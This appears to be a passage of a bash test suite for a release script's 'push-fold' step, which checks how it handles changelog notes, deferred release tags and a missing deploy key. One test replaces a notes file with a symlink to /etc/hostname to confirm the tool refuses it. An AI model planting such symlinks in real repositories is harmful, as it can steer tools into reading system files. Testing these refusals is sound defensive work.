fold_refused "a notes file holding a ## line" ".*plain_main@${base:0:12}\.md, the notes of packages/plain for $main_label, holds a line starting '## '"
fold_case fold-symlink
rm "$fc/notes/rel_1.9.0.md" && ln -s /etc/hostname "$fc/notes/rel_1.9.0.md"
push_fold
fold_refused "a notes file that is a symlink" "rel_1\.9\.0\.md in .* is not a regular file"
fold_case fold-present
# A changelog on main that already holds the 1.9.0 heading: the base is that commit.
git -C "$fc/a" checkout -q --detach "$base"
printf '\n## [1.9.0] - 2026-03-02\n' >> "$fc/a/packages/rel/CHANGELOG.md"
git -C "$fc/a" commit -q -am "docs: a 1.9.0 heading by hand"
fold_base=$(git -C "$fc/a" rev-parse HEAD) fold_tip=$(git -C "$fc/a" rev-parse HEAD)
git -C "$fc/a" push -q "$fc/origin.git" HEAD:refs/heads/main
fold_specs=(packages/rel=rel-v)
rm "$fc/notes/side_$main_label.md" "$fc/notes/plain_$main_label.md"
push_fold
fold_refused "a label whose heading is already there" "packages/rel/CHANGELOG.md already holds the heading ## \[1\.9\.0\]"
fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)
fold_case fold-no-key
push_fold DEPLOY_KEY=
fold_refused "a missing DEPLOY_KEY" "DEPLOY_KEY is unset or empty"
check "push-fold refuses a missing DEPLOY_KEY: nothing is made in TMPDIR" "$(is "$left" 0)"

# A release tag pushed between the two jobs: the build planned and rendered without it, and the
# publish job's checkout fetches every tag again, so its plan holds a group the notes lack. A
# release workflow running beside the fold does this (the listener pushes its tag in its publish
# job). The fold of that run must not fail the run, and must not delete a fragment it holds no
# notes for.
fold_case fold-tag-between-jobs
git -C "$fc/a" tag rel-v1.11.0 "$base"
push_fold
third_kept=$(git -C "$fc/origin.git" cat-file -e "main:packages/rel/$u/INFRA-3-third.yaml" 2>/dev/null && echo true || echo false)
check "push-fold, a release tag pushed between the jobs: exits 0 and keeps the fragment the notes do not hold" \
  "$(is "$rc|$third_kept" "0|true")"

# The same run folds every group the notes hold, as a run without the new tag does (fold-accepted
# above), and names the group it defers.
o="$fc/origin.git"
accepted="$work/fold-accepted/origin.git"
check "push-fold, a release tag pushed between the jobs: origin's main is one commit over the base" \
  "$(is "$(git -C "$o" rev-list --count "$base..main")|$(git -C "$o" log -1 --format=%P main)" "1|$base")"
check "push-fold, a release tag pushed between the jobs: the groups the notes hold land, their fragments gone and nothing else changed" \
  "$(is "$(git -C "$o" diff --name-status "$base" main)" "$(git -C "$accepted" diff --name-status "$base" main)")"
check "push-fold, a release tag pushed between the jobs: their blocks are in the changelogs, and the deferred version's is not" \
  "$(is "$(git -C "$o" show main:packages/rel/CHANGELOG.md)|$(git -C "$o" show main:packages/side/CHANGELOG.md)|$(git -C "$o" show main:packages/plain/CHANGELOG.md)" \
    "$(git -C "$accepted" show main:packages/rel/CHANGELOG.md)|$(git -C "$accepted" show main:packages/side/CHANGELOG.md)|$(git -C "$accepted" show main:packages/plain/CHANGELOG.md)")"
check "push-fold, a release tag pushed between the jobs: a notice names the deferred package and label" \
  "$(contains "$out" '^::notice title=Fold deferred::packages/rel 1\.11\.0 is not folded in this run and its fragments stay on main: .*its release tag is newer than the build; a later run folds it')"
check "push-fold, a release tag pushed between the jobs: one notice, for that group alone" \
  "$(is "$(grep -c 'title=Fold deferred' <<<"$out")" 1)"

# Every group of the plan is a version group the notes lack: nothing is left to fold.
fold_case fold-all-deferred
fold_specs=(packages/rel=rel-v)
git -C "$fc/a" tag rel-v1.11.0 "$base"
rm "$fc/notes/rel_1.9.0.md" "$fc/notes/rel_1.10.0.md" "$fc/notes/side_$main_label.md" "$fc/notes/plain_$main_label.md"
push_fold
check "push-fold, every group deferred: exits 0, saying nothing is folded in this run" \
  "$(is "$rc|$(contains "$out" '^Nothing to fold in this run: every group of the plan is deferred')" "0|true")"
check "push-fold, every group deferred: a notice for each group, in the plan's order" \
  "$(is "$(sed -n 's/^::notice title=Fold deferred::\(packages\/rel [0-9.]*\) is not folded in this run.*/\1/p' <<<"$out")" "packages/rel 1.9.0
packages/rel 1.10.0
packages/rel 1.11.0")"
check "push-fold, every group deferred: nothing written, origin untouched, gh not called" "$(is "$(untouched)" "true")"
fold_specs=(packages/rel=rel-v packages/side packages/plain packages/empty)

# Only a notes name that does not exist at all defers its group: one that is there as a symlink,
# even a dangling one, is refused as the build's fault.
fold_case fold-deferred-symlink
git -C "$fc/a" tag rel-v1.11.0 "$base"
ln -s "$fc/nowhere" "$fc/notes/rel_1.11.0.md"
push_fold
fold_refused "a version group's notes that are a dangling symlink" "rel_1\.11\.0\.md in .* is not a regular file"
check "push-fold refuses a version group's notes that are a dangling symlink: defers nothing" \
  "$(is "$(contains "$out" 'Fold deferred')" false)"

summary "release-push.sh version, push-main, tagged, tag, release, push-tag, check-built, extract-built, push-built, handed, no-credential, fold-plan and push-fold"

